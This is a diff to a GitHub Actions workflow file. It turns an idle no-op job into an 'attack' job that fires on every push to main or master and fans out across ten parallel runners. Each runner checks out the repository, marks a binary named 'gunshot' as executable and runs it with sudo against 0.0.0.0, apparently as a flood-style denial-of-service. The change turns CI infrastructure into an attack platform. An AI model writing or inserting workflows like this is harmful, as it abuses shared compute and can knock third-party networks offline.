@@ -1,7 +1,24 @@
-name: idle
-on: workflow_dispatch
+name: psycho-d11b72c8
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
 jobs:
-  noop:
-    runs-on: ubuntu-latest
+  attack:
+    runs-on: ubuntu-24.04
+    strategy:
+      fail-fast: false
+      matrix:
+        n: [1,2,3,4,5,6,7,8,9,10]
     steps:
-    - run: echo waiting
+    - name: Checkout
+      uses: actions/checkout@v4
+    - name: Verify binary
+      run: ls -la && file gunshot || true
+    - name: Make executable
+      run: chmod +x gunshot
+    - name: Fire
+      run: sudo ./gunshot 0.0.0.0 1 1 200
+      continue-on-error: true
+    - name: Nonce d11b72c8
+      run: echo "nonce=d11b72c8"
